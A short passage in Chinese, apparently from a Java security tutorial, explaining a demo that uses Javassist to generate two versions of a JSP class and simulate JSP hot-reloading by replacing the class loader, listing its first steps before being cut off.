+该示例程序通过Javassist动态生成了两个不同的`com.anbai.sec.classloader.test_jsp`类字节码，模拟JSP文件修改后的类加载，核心原理就是**检测到JSP文件修改后动态替换类加载器**，从而实现JSP热加载，具体的处理逻辑如下（第3和第4部未实现，使用了Javassist动态创建）：
 
 1. 模拟客户端第一次访问test.jsp；
 2. 检测是否已缓存了test.jsp的类加载；
